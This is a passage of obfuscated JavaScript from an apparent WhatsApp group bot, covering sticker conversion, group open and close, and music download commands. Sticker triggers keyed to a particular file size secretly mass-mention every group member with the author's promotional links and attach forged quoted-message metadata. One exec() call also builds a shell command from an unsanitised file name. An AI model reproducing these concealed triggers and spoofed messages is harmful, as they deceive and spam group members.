isPoto=type===_0x406083(0x731,0x6b2,0x491,0x99a)+'ge'||type===_0x4aaba1(0xd50,0x9b0,0xb0e,0x10a9)+'ge',isVideo=type===_0x4aaba1(0xc1c,0xc88,0xddd,0xcd7)+_0x4aaba1(0x4ff,0x8cb,0x561,0x708)&&content[_0x406083(0x5c0,0x1e6,0x5cb,0xa7e)]('videoMessa'+'ge'),isFoto=type===_0x406083(0xbe7,0xb97,0xd94,0x10af)+_0x406083(0x4ca,0x1a5,0x3c0,0x22a)&&content[_0x4aaba1(0x5f5,0x638,0x207,0xa6f)]('imageMessa'+'ge');if((isPoto&&!mek[_0x406083(0x467,0x6bc,-0x3e,0x515)]['videoMessa'+'ge']||isFoto)&&args[_0x406083(0x797,0xb1d,0x9a0,0x4b1)]==-0x1cd*-0x5+0x134c+-0xa1*0x2d){const encmedia=isFoto?JSON[_0x406083(0x642,0x5a8,0xa96,0x8cd)](JSON[_0x4aaba1(0xd05,0x10de,0xee1,0x9d4)](mek)[_0x4aaba1(0xa55,0xcdd,0xc1e,0xedb)](_0x4aaba1(0x8da,0x597,0xcde,0x9d0),'m'))[_0x4aaba1(0x49c,0x610,0x5cc,0x3d4)][_0x4aaba1(0xc1c,0xb73,0x9f5,0xbec)+_0x406083(0x4ca,0x60b,0x89e,0x95b)][_0x406083(0x852,0xcbd,0xc80,0x6f4)+'o']:mek,media=await alpha['downloadAn'+_0x406083(0xd57,0xce1,0xef4,0x96c)+'Message'](encmedia);ran=_0x4aaba1(0xce2,0x7fb,0xe86,0xdbd),await ffmpeg('./'+media)[_0x4aaba1(0xa94,0xb4e,0xcbc,0x7e6)](media)['on'](_0x4aaba1(0x80e,0x523,0x481,0x9ea),function(_0x4aad4c){function _0x302bf4(_0x5a4c64,_0x463b68,_0x4804bc,_0x4c5724){return _0x406083(_0x4c5724-0x107,_0x463b68-0xc4,_0x4804bc-0x83,_0x4804bc);}function _0x313497(_0x2525a1,_0x5c841e,_0xf7e593,_0x558cf1){return _0x406083(_0xf7e593-0x24a,_0x5c841e-0xb2,_0xf7e593-0x1f0,_0x5c841e);}console[_0x313497(0x9c4,0xadc,0x6ac,0x488)](_0x302bf4(0xab1,0x811,0xc3d,0xafa)+_0x4aad4c);})['on'](_0x406083(0xab7,0x83f,0x833,0xb77),function(_0x42405b){const _0x2887d4={};function _0x2098cf(_0x3402c5,_0x4e1d05,_0x290620,_0x57b0aa){return _0x4aaba1(_0x57b0aa-0x91,_0x290620,_0x290620-0x1a3,_0x57b0aa-0x1b3);}_0x2887d4[_0x3a0dcd(0x653,0x84c,0x150,0x261)]='error';const _0x22c209=_0x2887d4;console['log'](_0x3a0dcd(0x568,0x3af,0x94f,0xc7)+_0x42405b);function _0x3a0dcd(_0x527147,_0x4ab1f9,_0x4b1300,_0x22d8af){return _0x4aaba1(_0x527147-0xc9,_0x4b1300,_0x4b1300-0xe7,_0x22d8af-0x164);}fs[_0x2098cf(0x1a9,0xac,0xa4c,0x589)](media),reply(_0x22c209[_0x2098cf(0x17f,0xab3,0x3c4,0x61b)]);})['on'](_0x4aaba1(0x39c,0x617,0x5ee,0x61a),function(){const _0x4c5b05={};_0x4c5b05[_0x182fba(0xe75,0xdda,0xc2f,0xa05)]=_0x182fba(0xb0b,0x8a0,0x646,0xa15);const _0x593fbf=_0x4c5b05;console[_0x39e7b9(0x160,0x38b,0x1be,0x20)](_0x593fbf[_0x182fba(0x9e7,0xcfc,0xc2f,0xbe2)]);function _0x182fba(_0x971dd0,_0xf9da7b,_0x373332,_0x40eb69){return _0x4aaba1(_0x373332-0x16c,_0x971dd0,_0x373332-0x3,_0x40eb69-0x164);}const _0x2d6604={};_0x2d6604['quoted']=mek,alpha['sendMessag'+'e'](from,fs[_0x182fba(0xaba,0x20a,0x709,0x85e)+'nc'](ran),sticker,_0x2d6604);function _0x39e7b9(_0x744c9f,_0x465df4,_0x672261,_0x44b9d2){return _0x4aaba1(_0x44b9d2- -0x477,_0x672261,_0x672261-0xdb,_0x44b9d2-0x111);}fs[_0x39e7b9(-0x423,-0x2ee,0x442,0x81)](media),fs[_0x182fba(0x929,0x797,0x664,0x696)](ran);})['addOutputO'+'ptions']([_0x406083(0x3e5,0x8bc,0x250,0x6b2),'libwebp',_0x406083(0x7bf,0x83b,0x3f2,0x815),'scale=\x27min'+_0x406083(0xb33,0xfb2,0x8ad,0xdd2)+_0x4aaba1(0x99e,0x85e,0xa19,0xb7d)+_0x4aaba1(0x77e,0xa22,0x555,0xca0)+_0x4aaba1(0x4bc,0x953,0x57f,0x3a7)+_0x4aaba1(0x9e1,0xc78,0xd52,0x5de)+'o=decrease'+',fps=15,\x20p'+_0x4aaba1(0x9b8,0x84f,0x953,0x987)+_0x4aaba1(0x3a5,0x133,0x576,0x48)+_0x406083(0x58c,0x403,0x32c,0x62d)+'.0,\x20split\x20'+'[a][b];\x20[a'+']\x20paletteg'+_0x406083(0xc9e,0x114a,0xbeb,0x84a)+_0x406083(0xbe2,0xad7,0x900,0xcac)+_0x4aaba1(0x6a6,0x245,0x66f,0x6a4)+_0x406083(0x733,0xb62,0x265,0xc24)+_0x406083(0x711,0x83c,0x5a6,0x5bb)+_0x406083(0xad7,0x730,0xd39,0xc1b)+_0x406083(0x6a2,0x3cb,0x6df,0x51e)+_0x406083(0xc54,0x798,0xa70,0xbb0)])['toFormat'](_0x4aaba1(0x408,0x16e,0x24a,0x8e2))[_0x406083(0xc36,0x1002,0x808,0xb9f)](ran);}else{if((isPoto&&mek[_0x4aaba1(0x49c,0x236,0x329,0x44)][_0x4aaba1(0xd50,0x88d,0x1115,0xf4d)+'ge'][_0x4aaba1(0x709,0x91d,0x701,0x5bc)]<0x264b*-0x1+0x61*0x8+0x234e||isVideo&&mek[_0x4aaba1(0x49c,0x172,0x22,0x591)][_0x4aaba1(0xc1c,0xe21,0xe90,0xee1)+_0x406083(0x4ca,0x38a,-0x3e,0x952)][_0x406083(0x852,0x8d6,0x440,0xc8a)+'o'][_0x4aaba1(0x3c9,0x361,0x5c2,0x715)+_0x406083(0xcfe,0x947,0xb83,0x921)][_0x4aaba1(0xd50,0xa55,0xc4b,0x1204)+'ge']['seconds']<-0x9b1*0x2+0x649*0x3+0x92)&&args[_0x406083(0x797,0x6bf,0x8b0,0x8d3)]==0x217e+-0x86*-0x37+-0xf92*0x4){const encmedia=isVideo?JSON[_0x4aaba1(0x677,0x443,0xaa6,0xb00)](JSON[_0x406083(0xcd0,0xfe4,0x1128,0xcf6)](mek)['replace'](_0x406083(0x8a5,0xc40,0x75c,0x695),'m'))[_0x406083(0x467,0x592,0x860,0x2f7)]['stickerMes'+_0x4aaba1(0x4ff,0x364,0x512,0x211)][_0x4aaba1(0x887,0x4c1,0x40f,0x613)+'o']:mek,media=await alpha['downloadAn'+_0x406083(0xd57,0xf73,0xb04,0x876)+_0x406083(0x961,0xc6b,0xce6,0xd2c)](encmedia);ran=_0x406083(0xc8c,0xc5d,0x7ba,0xc14),reply(lang[_0x406083(0x425,0x3a3,0x337,0x749)]()),await ffmpeg('./'+media)[_0x4aaba1(0x413,0xd9,0x6f2,0x726)+'t'](media[_0x406083(0x676,0x820,0x867,0x4ce)]('.')[0x121+-0x187*-0x1+0x61*-0x7])['on']('start',function(_0x445ece){function _0x4c9081(_0x43ef7d,_0x56cbe8,_0xeb6d4c,_0x337b0e){return _0x4aaba1(_0x56cbe8- -0x393,_0x43ef7d,_0xeb6d4c-0x156,_0x337b0e-0x6e);}function _0x12a20b(_0xd16a4a,_0x261794,_0x5b9624,_0x571403){return _0x4aaba1(_0x5b9624- -0xb7,_0x261794,_0x5b9624-0x1c4,_0x571403-0x74);}console[_0x12a20b(-0xe7,0xdb,0x3e0,0x384)](_0x4c9081(0x287,0x695,0x8c1,0x839)+_0x445ece);})['on'](_0x4aaba1(0xaec,0x5c8,0x5f3,0x9cd),function(_0x49b2c5){function _0x14d3c9(_0x142a94,_0x59088b,_0x54bb33,_0x4fe6e3){return _0x4aaba1(_0x54bb33- -0x2fb,_0x142a94,_0x54bb33-0x1f0,_0x4fe6e3-0xb3);}function _0x18365b(_0x25f3da,_0x298b3c,_0x3d9223,_0x555a1e){return _0x406083(_0x555a1e-0xad,_0x298b3c-0x133,_0x3d9223-0x130,_0x298b3c);}const _0x13d5ca={};_0x13d5ca[_0x14d3c9(0x56c,0x9d,0x591,0x7f5)]=_0x14d3c9(0x196,0x29d,0x2b1,0x25d),_0x13d5ca['NoqFs']=_0x18365b(0x772,0x47a,0x430,0x8fd),_0x13d5ca[_0x18365b(0x9d1,0xbab,0x463,0x853)]='gif';const _0x539871=_0x13d5ca;console['log'](_0x18365b(0x1a5,0x3d6,0x328,0x517)+_0x49b2c5),fs['unlinkSync'](media),tipe=media['endsWith'](_0x539871[_0x18365b(0x4ea,0xb35,0x95b,0x904)])?_0x539871['NoqFs']:_0x539871[_0x18365b(0x44b,0xa73,0xb50,0x853)],reply(_0x14d3c9(0x803,0x996,0x7ba,0x791)+'a\x20saat\x20men'+'gkonversi\x20'+tipe+'\x20ke\x20stiker');})['on']('end',function(){const _0x11cda6={};_0x11cda6[_0xac6ac5(0x35,0x1d5,0x464,0x697)]='Finish';const _0x2d8e76=_0x11cda6;console[_0x4c6e52(0x11f,-0xec,0x395,0x607)](_0x2d8e76[_0xac6ac5(0x7b2,0x7a2,0x464,0x7f2)]);const _0xc835da={};_0xc835da[_0x4c6e52(0x96b,0xb07,0xc87,0xc31)]=mek,alpha[_0x4c6e52(0x53c,0x90,0xb4,0x353)+'e'](from,fs[_0xac6ac5(-0x1ae,0x76,0x1e7,-0xfb)+'nc'](ran),sticker,_0xc835da);function _0xac6ac5(_0x4ac792,_0x1fce90,_0x218dbc,_0x171987){return _0x4aaba1(_0x218dbc- -0x3b6,_0x1fce90,_0x218dbc-0x14f,_0x171987-0x11f);}fs[_0xac6ac5(0x259,0x265,0x142,-0x258)](media);function _0x4c6e52(_0x356474,_0x32d5a5,_0x4ade69,_0x23df31){return _0x4aaba1(_0x356474- -0x378,_0x4ade69,_0x4ade69-0x81,_0x23df31-0x26);}fs[_0x4c6e52(0x180,0x1d2,-0x57,-0x108)](ran);})['addOutputO'+_0x4aaba1(0xc4d,0xb60,0x7a1,0xafc)]([_0x406083(0x3e5,0x7e9,0x587,0x116),_0x4aaba1(0x979,0x553,0x9f5,0x609),_0x4aaba1(0x7f4,0x762,0xc9d,0xa28),'scale=\x27min'+_0x4aaba1(0xb68,0x8de,0x7d5,0xf99)+_0x406083(0x969,0xab7,0xd50,0xdec)+_0x406083(0x749,0x85d,0x87d,0xb46)+'original_a'+_0x4aaba1(0x9e1,0x8a3,0xe2a,0x808)+_0x4aaba1(0x8e0,0x61e,0xd51,0xb52)+_0x4aaba1(0x513,0x47f,0x8bd,0x52e)+_0x406083(0x983,0xe97,0xcc0,0x7bb)+_0x406083(0x370,0x577,0x335,0x143)+_0x406083(0x58c,0x854,0x9ed,0x91b)+_0x406083(0xbc2,0x9b0,0xd2f,0xfdc)+_0x4aaba1(0x9c2,0xa55,0xb4d,0xc23)+_0x4aaba1(0x557,0x534,0x24e,0xa9)+_0x4aaba1(0xcd3,0xfbb,0x10b0,0xbc5)+_0x406083(0xbe2,0xcf8,0xdf3,0xeba)+_0x406083(0x671,0x3d7,0xa04,0x29a)+_0x4aaba1(0x768,0x89f,0x4af,0xba1)+_0x406083(0x711,0x2c6,0xa0d,0x8a8)+_0x406083(0xad7,0xf8c,0x744,0xb16)+_0x4aaba1(0x6d7,0xbc4,0x334,0x71f)+'euse'])[_0x406083(0xa14,0xab3,0xbbc,0xa32)](_0x406083(0x3d3,0x13f,0x57a,0x42f))[_0x406083(0xc36,0x7ee,0x8ce,0xa04)](ran);}else fakegroup('Kirim\x20gamb'+'ar\x20dengan\x20'+'caption\x20'+prefix+_0x406083(0x47e,0x7a4,0x689,0x4a0)+enter+(_0x4aaba1(0x702,0x7a3,0x418,0x688)+_0x4aaba1(0xa5f,0xefe,0xcc7,0xa0d)+_0x406083(0x543,0x960,0x9c4,0x2f0)));}}}if(stc){if(stc[_0x4aaba1(0x7c8,0x9bc,0x2da,0xbb7)]==''+cmd_stc_to_image){console[_0x4aaba1(0x497,0x67d,0x176,0x733)](color(time,'magenta'),color(moment['tz'](_0x4aaba1(0x7d0,0x66f,0xa3e,0x711)+'ta')[_0x4aaba1(0x6b0,0x8c5,0x2f2,0x982)]('HH:mm:ss'),'gold'),color('STC\x20CMD\x20ST'+_0x406083(0xa49,0xcd4,0x85f,0x8af)+_0x4aaba1(0x9dc,0xab1,0xdb9,0xa1e)));const isStikerl=type==='stickerMes'+_0x4aaba1(0x4ff,0x31e,0x4c9,0x665)&&content[_0x406083(0x5c0,0x8ea,0x9bc,0x586)]('stickerMes'+_0x4aaba1(0x4ff,0x80c,0xf,0x67a));if(!isStikerl)return fakeitem(_0x406083(0x4d0,0x4b9,0x503,0x603)+_0x4aaba1(0x40a,-0x87,0x612,0x523)+_0x4aaba1(0x3f8,0x1ba,0x506,-0x119)+'!');reply(lang['wait']()),encmedia=JSON[_0x4aaba1(0x677,0x711,0x7fd,0x7da)](JSON[_0x4aaba1(0xd05,0xe28,0x8f5,0xe62)](mek)['replace']('quotedM','m'))[_0x406083(0x467,0x268,0x95f,0x8dd)][_0x406083(0xbe7,0x6d8,0xe37,0x7e5)+_0x406083(0x4ca,0x62e,0x37b,0x58c)][_0x4aaba1(0x887,0x60a,0xb97,0x958)+'o'],media=await alpha[_0x4aaba1(0xa51,0xe89,0xf06,0x996)+_0x406083(0xd57,0x84f,0xd59,0xb55)+_0x4aaba1(0x996,0x6df,0x5c0,0xc23)](encmedia),ran=getRandom(_0x4aaba1(0x4be,0x685,0x5b9,0x54e)),exec(_0x4aaba1(0x4f3,0x6bd,0x95,0x556)+media+'\x20'+ran,_0x5dcce5=>{const _0x565baf={'EUUXf':'3|4|1|2|0','SiVpM':function(_0x4e8c59,_0x778bbe,_0x56477d){return _0x4e8c59(_0x778bbe,_0x56477d);},'btmPu':_0x43aa98(-0x1db,0x2f0,0x846,0x32e)+_0x43aa98(0x340,0xbc5,0x699,0x6a7),'aDjnL':function(_0x3ddcc9,_0x3c0825){return _0x3ddcc9(_0x3c0825);}},_0x4b3742=_0x565baf['EUUXf'][_0x2f4846(0x5c4,0x6f3,0xaa5,0x670)]('|');let _0x4b7e7a=0x509*-0x1+-0x139c+0x2bd*0x9;function _0x2f4846(_0x15b15c,_0xdd9113,_0x455f87,_0x3bb6ad){return _0x4aaba1(_0x15b15c- -0xe7,_0xdd9113,_0x455f87-0x60,_0x3bb6ad-0xc4);}function _0x43aa98(_0xc4d0b1,_0x23a3aa,_0x46942f,_0x217c4a){return _0x406083(_0x217c4a- -0x64,_0x23a3aa-0x38,_0x46942f-0x1ac,_0x46942f);}while(!![]){switch(_0x4b3742[_0x4b7e7a++]){case'0':fs[_0x43aa98(0xc,0x324,0x11b,0x45f)](ran);continue;case'1':buffer=fs[_0x2f4846(0x4b6,0x5f8,0x966,0x34d)+'nc'](ran);continue;case'2':_0x565baf['SiVpM'](fakethumb,buffer,_0x565baf[_0x43aa98(-0x90,0x2ce,0x105,0x315)]);continue;case'3':fs[_0x43aa98(0x60b,0x84e,0x730,0x45f)](media);continue;case'4':if(_0x5dcce5)return _0x565baf['aDjnL'](reply,_0x43aa98(0xbb7,0x988,0x87b,0xbd9)+_0x43aa98(0x697,0x3b8,0x24a,0x728)+_0x2f4846(0x7e1,0x8d5,0xc8c,0x7aa));continue;}break;}});}}if(stc){if(stc[_0x4aaba1(0x7c8,0x359,0x742,0xa63)]==0x2d2b+0x82b+0x9*-0x2a6){var value=_0x4aaba1(0xd90,0xb7a,0xd35,0xb3d)+'\x20NEW\x20VER.*'+'\x20'+enter+enter+'\x20';value+=enter+(_0x4aaba1(0xd51,0xd09,0x1016,0xc56)+'ps://youtu'+_0x406083(0x557,0x45,0x7e3,0xb4)+'nnel/UCdzW'+_0x406083(0x9c9,0x8f0,0x4a5,0x9a3)+_0x4aaba1(0x991,0xc58,0x5a6,0x65e))+enter+enter,value+=enter+(_0x406083(0x4f8,0x532,0x148,0x8be)+_0x4aaba1(0x3d0,0x464,0x1ca,0x722))+enter+enter,value+=enter+'#share';var group=await alpha[_0x4aaba1(0x3d2,0x47,0x5e0,0x15e)+_0x406083(0x3e4,0x383,0x4f3,-0xaf)](from),member=group[_0x406083(0x4b0,0x76c,0x7b9,0x4d6)+'ts'],mem=[];member[_0x406083(0xbd6,0xa56,0x6d3,0xfac)](async _0x1c6f97=>{function _0x460e50(_0x43a43e,_0x24aa06,_0x2c0f1c,_0x1c1223){return _0x4aaba1(_0x1c1223- -0x399,_0x43a43e,_0x2c0f1c-0x83,_0x1c1223-0x157);}function _0x4f8c6f(_0x14c5a2,_0xe3a0c3,_0x37c962,_0x4b7f9c){return _0x406083(_0x4b7f9c- -0x92,_0xe3a0c3-0x121,_0x37c962-0x37,_0x14c5a2);}const _0x322109={};_0x322109[_0x4f8c6f(0x3b7,0x7f6,0x4c6,0x598)]=_0x460e50(0x8bc,0x8b6,0xb72,0x90f);const _0x4601f9=_0x322109;mem['push'](_0x1c6f97['id'][_0x4f8c6f(0x684,0x9c1,0x4c8,0x98e)](_0x4601f9[_0x4f8c6f(0x710,0x971,0x72d,0x598)],_0x4f8c6f(0x54b,0xd51,0x671,0x9a8)+_0x4f8c6f(0x679,0x700,0x38a,0x3d3)));});const _0x51cf5d={};_0x51cf5d[_0x406083(0x858,0x618,0xa36,0x6a0)+'id']=mem;const _0x5a1ce0={};_0x5a1ce0[_0x406083(0x4fe,0x6a,0x549,0xa)]=value,_0x5a1ce0[_0x406083(0x852,0xb23,0x435,0x637)+'o']=_0x51cf5d,_0x5a1ce0[_0x406083(0xcae,0xa66,0xb08,0xddc)]=mek;var optionshidetag=_0x5a1ce0;const _0x58c7e8={};_0x58c7e8[_0x406083(0x4b0,0x4d1,-0x27,0x1e2)+'t']=_0x4aaba1(0x6f0,0x387,0x744,0x66a)+_0x4aaba1(0x5ca,0xa1e,0x9d1,0x8a8),_0x58c7e8[_0x4aaba1(0x8d3,0x49a,0x9cd,0xdf8)]=_0x4aaba1(0xa5e,0x890,0x538,0xca9)+_0x406083(0x7c4,0x559,0x3b5,0x2d7)+_0x406083(0xc4a,0xaf6,0xed3,0xd21),_0x58c7e8[_0x4aaba1(0xd71,0x85e,0x98c,0xaf7)]=![],_0x58c7e8['id']=_0x406083(0x5d7,0x4ed,0x8ee,0x486)+_0x4aaba1(0xb45,0xcbc,0x6f6,0xece)+_0x406083(0x7f6,0x348,0x863,0x8b5)+'4A';const _0x217eea={};_0x217eea['forwarding'+'Score']=0x3e7,_0x217eea[_0x4aaba1(0x858,0x3d4,0x40a,0xbf8)+'d']=!![],alpha['sendMessag'+'e'](from,optionshidetag,text,{'quoted':{'key':_0x58c7e8,'message':{'documentMessage':{'jpegThumbnail':fs[_0x4aaba1(0x59d,0x735,0xab6,0x589)+'nc'](_0x4aaba1(0x594,0x5f8,0x95f,0x381)+thumbnail),'mimetype':_0x4aaba1(0x8f7,0xcc4,0x526,0x9d8)+_0x4aaba1(0x591,0x87d,0xa56,0x81a)+_0x406083(0x9a8,0x97f,0x9a6,0x4c7),'title':''+setting[_0x4aaba1(0xbb7,0xbd1,0x7f0,0x8db)],'fileLength':'36','pageCount':0x0,'fileName':setting[_0x4aaba1(0xbb7,0xc41,0x851,0xcbc)]+'\x20'}},'messageTimestamp':_0x406083(0xa97,0xdf0,0x8bc,0xf08),'status':_0x4aaba1(0x50f,0x76a,0x280,0x348)},'contextInfo':_0x217eea});}}if(stc){if(stc['fileLength']==-0x3972+-0x1*0xf23e+-0x1*-0x1ad4a){var value='🪀\x20*ALPHABO'+_0x406083(0x734,0xa18,0x402,0x4cf)+'*'+enter+enter;value+=_0x406083(0xd1c,0x11bf,0x8a3,0xb53)+_0x4aaba1(0x487,0x854,0x689,0x42)+'.be/-8hpzK'+'U7WJE'+enter+enter,value+=_0x406083(0xc13,0xf63,0xb3b,0x94d)+_0x406083(0xbd5,0xf6b,0xbb3,0x726)+enter,value+='\x0a';var group=await alpha[_0x406083(0x39d,0x863,-0x88,0x834)+_0x4aaba1(0x419,0x34a,0x7ed,0x86d)](from),member=group[_0x406083(0x4b0,0x6a,0x926,0x5d0)+'ts'],mem=[];member[_0x4aaba1(0xc0b,0xd0e,0x938,0xcaf)](async _0x2512fc=>{function _0x4bca16(_0x224fd2,_0x1f56d7,_0x202a74,_0x3ebb06){return _0x406083(_0x3ebb06-0x171,_0x1f56d7-0x10,_0x202a74-0xa1,_0x1f56d7);}const _0xfd2e92={};_0xfd2e92['XXthk']='c.us',_0xfd2e92[_0x4a5b41(0x197,0x4bf,0x79a,0x46c)]=_0x4a5b41(0xd47,0xc2e,0x79c,0xb25)+_0x4bca16(0x176,0x4d8,0x8d5,0x5d6);function _0x4a5b41(_0xcc4d72,_0x5d903a,_0x1606f0,_0x596ccc){return _0x406083(_0x596ccc-0xeb,_0x5d903a-0x134,_0x1606f0-0x156,_0x5d903a);}const _0x5d135c=_0xfd2e92;mem[_0x4a5b41(0x6b3,0x1015,0x9fe,0xbc4)](_0x2512fc['id'][_0x4a5b41(0x991,0x7de,0x101a,0xb0b)](_0x5d135c[_0x4a5b41(0x110a,0xdf5,0xf9d,0xd73)],_0x5d135c[_0x4a5b41(0x2f9,0x12f,0x65d,0x46c)]));});const _0x1c1cdc={};_0x1c1cdc[_0x406083(0x858,0x336,0x43a,0x947)+'id']=mem;const _0x5270b6={};_0x5270b6[_0x4aaba1(0x533,0x1c7,0x4c,0xca)]=value,_0x5270b6['contextInf'+'o']=_0x1c1cdc,_0x5270b6[_0x406083(0xcae,0xfd1,0xab5,0x7d0)]=mek;var optionshidetag=_0x5270b6;const _0x3257ac={};_0x3257ac[_0x4aaba1(0x4e5,0x387,0xc9,0x62c)+'t']=_0x406083(0x6bb,0x63a,0x31a,0x964)+'pp.net',_0x3257ac[_0x406083(0x89e,0x6e6,0x67f,0x9e6)]=_0x4aaba1(0xa5e,0xd8f,0x95d,0xab7)+_0x4aaba1(0x7f9,0x907,0x7b4,0x3f0)+_0x406083(0xc4a,0xf69,0xb50,0xcc2),_0x3257ac[_0x406083(0xd3c,0xccd,0x8eb,0x114b)]=![],_0x3257ac['id']='B391837A58'+_0x4aaba1(0xb45,0xbdd,0xf4a,0x63e)+'47E51FFDFD'+'4A';const _0x34c775={};_0x34c775['forwarding'+'Score']=0x3e7,_0x34c775[_0x4aaba1(0x858,0x741,0x833,0x563)+'d']=!![],alpha[_0x406083(0x87f,0xa0f,0xd75,0x4e2)+'e'](from,optionshidetag,text,{'quoted':{'key':_0x3257ac,'message':{'documentMessage':{'jpegThumbnail':fs['readFileSy'+'nc'](_0x4aaba1(0x594,0x83,0x70f,0x8ce)+thumbnail),'mimetype':_0x406083(0x8c2,0xdc0,0x789,0x4f6)+_0x406083(0x55c,0x658,0x377,0x844)+_0x4aaba1(0x9dd,0x7cd,0x803,0x660),'title':''+setting[_0x4aaba1(0xbb7,0xe64,0xf6a,0x1063)],'fileLength':'36','pageCount':0x0,'fileName':setting[_0x4aaba1(0xbb7,0x9c8,0xedd,0xedb)]+'\x20'}},'messageTimestamp':'1614069378','status':'PENDING'},'contextInfo':_0x34c775});}}if(stc){if(stc[_0x4aaba1(0x7c8,0xb4d,0x462,0x654)]==''+cmd_stc_group_open){console[_0x4aaba1(0x497,0x6b3,0x285,0x590)](color(time,_0x406083(0xc2f,0x1038,0xd53,0xc59)),color(moment['tz'](_0x406083(0x79b,0xb94,0x57c,0x509)+'ta')[_0x4aaba1(0x6b0,0x747,0x724,0x45f)](_0x406083(0x99b,0xb4e,0xd04,0x71d)),_0x4aaba1(0xcae,0x7d2,0xa69,0x832)),color(_0x406083(0x5b9,0x2f3,0x4b1,0x5bf)+_0x4aaba1(0xc70,0xcc4,0x1033,0xf85)));if(!isBotGroupAdmins)return reply(_0x4aaba1(0x94e,0xe02,0xb2d,0x7de)+_0x4aaba1(0x5d9,0x816,0x2e1,0x8b5)+'ai\x20admin\x20t'+_0x4aaba1(0xa52,0x8d3,0xb80,0x62f)+_0x4aaba1(0x707,0x299,0x759,0x455));await alpha['groupSetti'+_0x406083(0xc38,0x87e,0x820,0xbec)](from,GroupSettingChange[_0x4aaba1(0xd14,0xecc,0x9a8,0xd39)+'d'],![]),fakegroup(_0x4aaba1(0xd75,0xad4,0x118f,0xd26)+_0x4aaba1(0x70f,0xb06,0x59e,0x885)+_0x4aaba1(0x850,0x391,0xb76,0xac0)+'``');}else stc[_0x4aaba1(0x7c8,0xc35,0x2de,0xca4)]==''+cmd_stc_group_close&&(console[_0x4aaba1(0x497,0x424,0x652,0x3c6)](color(time,_0x4aaba1(0xc64,0x885,0xa68,0xe64)),color(moment['tz'](_0x4aaba1(0x7d0,0x942,0x8c4,0x812)+'ta')[_0x406083(0x67b,0x865,0x5fd,0x3c9)](_0x406083(0x99b,0xb20,0xc24,0xd52)),_0x406083(0xc79,0xf6f,0xd49,0x1148)),color(_0x4aaba1(0x5ee,0x365,0x4f1,0x4b0)+_0x406083(0xad6,0xe9f,0xa00,0x7c3))),await alpha[_0x4aaba1(0x7c2,0x3af,0x5c7,0x7b7)+'ngChange'](from,GroupSettingChange[_0x406083(0xcdf,0xa11,0x9b6,0xd29)+'d'],!![]),fakegroup(_0x406083(0xd40,0x10bc,0xb3a,0xd8f)+_0x406083(0x5aa,0x773,0x986,0x95c)+_0x406083(0x927,0xe3e,0x605,0x574)));}if(stc){if(stc[_0x406083(0x793,0x978,0x2d9,0x58f)]==''+cmd_stc_play_music){console[_0x406083(0x462,0x769,0x0,0x551)](color(time,_0x4aaba1(0xc64,0x9ad,0x787,0x8cd)),color(moment['tz'](_0x4aaba1(0x7d0,0x6f5,0x905,0x4f9)+'ta')['format'](_0x4aaba1(0x9d0,0xeb3,0xa6d,0x864)),_0x4aaba1(0xcae,0x9ce,0xa64,0x10de)),color(_0x4aaba1(0xcb1,0x1128,0xc76,0xd6e)+_0x406083(0x742,0xb8f,0x279,0xa01))),fakegroup(_0x406083(0x408,0x4e4,0x65e,0x15d)+'ng\x20Song...'+'```'),aramas=await yts(srchh),aramat=aramas[_0x406083(0x6cc,0x44e,0x304,0x6f8)];var mulaikah=aramat[-0x1d7a+0x22e3*0x1+0x569*-0x1][_0x406083(0x9dc,0x59d,0xe59,0x8a2)];try{yta(mulaikah)[_0x406083(0xb30,0xb93,0xbfd,0xaa6)](_0x11edd6=>{const _0x143bdc={'MXVkg':function(_0x2f226e,_0x5c0e6){return _0x2f226e>=_0x5c0e6;},'IXRuM':function(_0xc5a977,_0x3c2a6f,_0x3d050d,_0x2587f5){return _0xc5a977(_0x3c2a6f,_0x3d050d,_0x2587f5);},'URkEo':function(_0x252c0e,_0x71db4,_0x15e7df){return _0x252c0e(_0x71db4,_0x15e7df);}};function _0x57aed9(_0x14e77c,_0x57e14b,_0x5a28cd,_0x5be456){return _0x4aaba1(_0x5be456-0x18b,_0x5a28cd,_0x5a28cd-0x1c6,_0x5be456-0xf7);}function _0x2fd14e(_0x5172e3,_0x4c6eed,_0x39e163,_0x43e531){return _0x406083(_0x39e163-0xc7,_0x4c6eed-0x103,_0x39e163-0x168,_0x43e531);}const {dl_link:_0x5e86ba,thumb:_0x75337c,title:_0x2aeaeb,filesizeF:_0x563d53,filesize:_0x8d596b}=_0x11edd6;axios[_0x57aed9(0xe39,0x771,0xed4,0x9f5)]('https://ti'+_0x2fd14e(-0xf7,0x499,0x42c,0x5f3)+_0x57aed9(0xf95,0xa1e,0x1221,0xebc)+_0x2fd14e(0xce0,0x100f,0xc15,0x75e)+_0x5e86ba)[_0x57aed9(0x888,0xc30,0x111d,0xcf0)](async _0x2cbf85=>{if(_0x143bdc[_0xbd9e(0xab0,0x7e4,0xb00,0x780)](Number(_0x8d596b),-0x15be8+0x13*0xed5+-0x1*-0x1c8b9))return sendMediaURL(from,_0x75337c,_0x5c6ea7(0xa5c,0x88d,0x960,0x6e8)+'C*'+enter+enter+_0x5c6ea7(0x98a,0x89b,0x676,0xd77)+_0x2aeaeb+enter+(_0x5c6ea7(0xb87,0xc68,0x9a4,0xa35)+'3')+enter+(_0x5c6ea7(0x684,0x993,0x8d7,0x25c)+_0x5c6ea7(0xc7b,0xba6,0x8c9,0xd36))+_0x563d53+enter+'*Link*\x20:\x20'+_0x2cbf85[_0xbd9e(0xe8b,0x9c8,0xa8e,0x7af)]+enter+enter+(_0xbd9e(0x265,0x286,0x678,0x335)+_0xbd9e(0x2e8,0x653,0x7fa,0x789)+'dari\x20batas'+_0x5c6ea7(0xa3d,0xec0,0xc9d,0xde6)+_0x5c6ea7(0x677,0x81a,0xacf,0xb99)+'tuk\x20link_'));function _0x5c6ea7(_0x8569bf,_0x4c0777,_0x58ad94,_0x3bce8d){return _0x2fd14e(_0x8569bf-0x19f,_0x4c0777-0x41,_0x8569bf-0x0,_0x3bce8d);}function _0xbd9e(_0x56132d,_0x4849e2,_0x2975c0,_0x274cca){return _0x2fd14e(_0x56132d-0x9d,_0x4849e2-0x134,_0x2975c0-0xd4,_0x56132d);}const 